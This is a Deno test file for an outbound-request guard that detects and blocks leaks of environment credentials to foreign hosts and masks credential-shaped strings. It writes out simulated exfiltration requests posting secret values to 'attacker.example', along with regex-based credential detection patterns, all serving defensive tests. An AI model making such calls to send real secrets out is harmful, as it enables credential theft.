import {
  CREDENTIAL_SHAPES, OutboundBlocked, allowedHostsFor, findLeak, guardFetch, hostAllowed, maskOutbound, maskOutboundText, maskedJson, secretsFrom,
} from "./outbound-guard.ts";
import { REDACTED, SECRET_SHAPES } from "./redact-secrets.ts";
function assert(c: unknown, m = "assertion failed"): asserts c { if (!c) throw new Error(m); }
function assertEquals<T>(a: T, b: T, m?: string) { if (JSON.stringify(a) !== JSON.stringify(b)) throw new Error(m ?? `expected ${JSON.stringify(b)}, got ${JSON.stringify(a)}`); }

const SERVICE = "svc_" + "s".repeat(40);
const DATA = "data-key-" + "d".repeat(40);
const SLACK_SECRET = "slack-secret-" + "x".repeat(30);
const ENV = {
  SUPABASE_URL: "https://proj.supabase.co",
  SUPABASE_SERVICE_ROLE_KEY: SERVICE,
  SUPABASE_ANON_KEY: "anon-" + "a".repeat(40),
  DATA_KEY: DATA,
  SLACK_CLIENT_SECRET: SLACK_SECRET,
  SLACK_CLIENT_ID: "1234567890.1234567890",
  SUPABASE_DB_URL: "postgresql://postgres:" + "p".repeat(24) + "@db.proj.supabase.co:5432/postgres",
  SHORT_TOKEN: "abc",
  HOME: "/root",
};
const SECRETS = secretsFrom(ENV);
const OWN = "proj.supabase.co";

Deno.test("secretsFrom: names that say secret, long values; the public anon key and ids are not secrets", () => {
  assertEquals(SECRETS.map((s) => s.name).sort(), ["DATA_KEY", "SLACK_CLIENT_SECRET", "SUPABASE_DB_URL", "SUPABASE_SERVICE_ROLE_KEY"]);
  assertEquals(allowedHostsFor("SLACK_CLIENT_SECRET"), ["slack.com"]);
  assertEquals(allowedHostsFor("SUPABASE_SERVICE_ROLE_KEY"), []);
  assertEquals(allowedHostsFor("GOOGLE_OAUTH_CLIENT_SECRET"), ["googleapis.com", "google.com"]);
});

Deno.test("hostAllowed: own project, the service's own domain and its subdomains, nothing that only looks alike", () => {
  assert(hostAllowed("proj.supabase.co", [], OWN));
  assert(hostAllowed("slack.com", ["slack.com"], OWN));
  assert(hostAllowed("api.slack.com", ["slack.com"], OWN));
  assert(!hostAllowed("evilslack.com", ["slack.com"], OWN));
  assert(!hostAllowed("slack.com.evil.io", ["slack.com"], OWN));
  assert(!hostAllowed("other.supabase.co", [], OWN));
});

Deno.test("findLeak: a NazAI credential to a host it does not belong to, in the address, a header or the body", () => {
  const base = { url: "https://hooks.example.com/x", headers: [] as [string, string][], body: null as string | null };
  assertEquals(findLeak(base, SECRETS, OWN), null);
  assertEquals(findLeak({ ...base, body: `{"note":"${SERVICE}"}` }, SECRETS, OWN)?.name, "SUPABASE_SERVICE_ROLE_KEY");
  assertEquals(findLeak({ ...base, headers: [["authorization", `Bearer ${SERVICE}`]] }, SECRETS, OWN)?.where, "header");
  assertEquals(findLeak({ ...base, url: `https://hooks.example.com/x?k=${encodeURIComponent(DATA)}` }, SECRETS, OWN)?.where, "address");
  assertEquals(findLeak({ ...base, body: `client_secret=${SLACK_SECRET}` }, SECRETS, OWN)?.name, "SLACK_CLIENT_SECRET");
  // allowed: its own service, and NazAI's own project
  assertEquals(findLeak({ url: "https://slack.com/api/oauth.v2.access", headers: [], body: `client_secret=${SLACK_SECRET}` }, SECRETS, OWN), null);
  assertEquals(findLeak({ url: "https://proj.supabase.co/functions/v1/agent-runtime", headers: [["authorization", `Bearer ${SERVICE}`]], body: null }, SECRETS, OWN), null);
  // but the service key never goes to slack
  assertEquals(findLeak({ url: "https://slack.com/api/chat.postMessage", headers: [], body: `text=${SERVICE}` }, SECRETS, OWN)?.name, "SUPABASE_SERVICE_ROLE_KEY");
});

Deno.test("guardFetch: refuses before sending; lets everything else through unchanged", async () => {
  const sent: string[] = [];
  const original = ((input: RequestInfo | URL) => { sent.push(String(input instanceof Request ? input.url : input)); return Promise.resolve(new Response("ok")); }) as typeof fetch;
  const guarded = guardFetch(original, () => ({ secrets: SECRETS, ownHost: OWN }));
  let blocked: unknown = null;
  try { await guarded("https://attacker.example/collect", { method: "POST", body: JSON.stringify({ k: SERVICE }) }); } catch (e) { blocked = e; }
  assert(blocked instanceof OutboundBlocked, "refused");
  assert(!String((blocked as Error).message).includes(SERVICE), "the message never contains the value");
  assertEquals(sent, []);
  // a Request object's body is checked too
  blocked = null;
  try { await guarded(new Request("https://attacker.example/c", { method: "POST", body: `x=${DATA}` })); } catch (e) { blocked = e; }
  assert(blocked instanceof OutboundBlocked, "Request body refused");
  // headers given as an object
  blocked = null;
  try { await guarded("https://attacker.example/c", { headers: { "x-key": DATA } }); } catch (e) { blocked = e; }
  assert(blocked instanceof OutboundBlocked, "header refused");
  // normal traffic
  assertEquals(await (await guarded("https://api.example.com/v1", { method: "POST", body: '{"hello":"world"}' })).text(), "ok");
  assertEquals(await (await guarded("https://proj.supabase.co/rest/v1/x", { headers: { apikey: SERVICE } })).text(), "ok");
  assertEquals(await (await guarded("https://slack.com/api/oauth.v2.access", { method: "POST", body: new URLSearchParams({ client_secret: SLACK_SECRET }) })).text(), "ok");
  assertEquals(sent.length, 3);
});

Deno.test("CREDENTIAL_SHAPES: the secrets rule's formats without plain JWTs (NazAI's own file links carry one)", () => {
  assert(CREDENTIAL_SHAPES.source !== SECRET_SHAPES.source, "the JWT alternative was removed");
  const jwt = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.abcdefghijk";
  assert(new RegExp(SECRET_SHAPES.source).test(jwt) && !new RegExp(CREDENTIAL_SHAPES.source).test(jwt));
  for (const k of ["sk-" + "A".repeat(20), "sk-ant-" + "b".repeat(24), "xoxb-123456789012-abcdef", "ghp_" + "c".repeat(24), "AKIA" + "D".repeat(16), "re_" + "e".repeat(24), "ntn_" + "f".repeat(32), "-----BEGIN PRIVATE KEY-----\nabc\n-----END PRIVATE KEY-----"]) {
    assert(new RegExp(CREDENTIAL_SHAPES.source).test(k), k.slice(0, 12));
  }
});

Deno.test("maskOutboundText: provider credentials, NazAI's own and the tool's key go; JWT links, ordinary text and short values stay", () => {
  const link = "https://proj.supabase.co/storage/v1/object/sign/f.png?token=eyJhbGciOiJIUzI1NiJ9.eyJ1cmwiOiJmIn0.sig_sig_sig";
  const toolKey = "tool-key-123456";
  const r = maskOutboundText(`use sk-${"Z".repeat(24)} and ${SERVICE} and ${toolKey}; file: ${link}; password: hunter2; code=1234`, [toolKey, "ab"], SECRETS);
  assertEquals(r.masked, 3);
  assert(!r.text.includes("sk-ZZ") && !r.text.includes(SERVICE) && !r.text.includes(toolKey));
  assert(r.text.includes(link) && r.text.includes("password: hunter2") && r.text.includes("code=1234"), r.text);
  assertEquals(maskOutboundText("nothing secret here", [], SECRETS), { text: "nothing secret here", masked: 0 });
});

Deno.test("maskOutbound / maskedJson: every string in a nested value, keys and other values kept", () => {
  const v = { a: [`x ${DATA}`, 5, { b: "xoxb-123456789012-abcdef" }], [`k`]: true, n: null };
  const r = maskOutbound(v, [], SECRETS);
  assertEquals(r.masked, 2);
  assertEquals(r.value, { a: [`x ${REDACTED}`, 5, { b: REDACTED }], k: true, n: null });
  assertEquals(v.a[0], `x ${DATA}`, "the original is not changed");
  assertEquals(JSON.parse(maskedJson({ t: "ghp_" + "c".repeat(24) })).t, REDACTED);
});
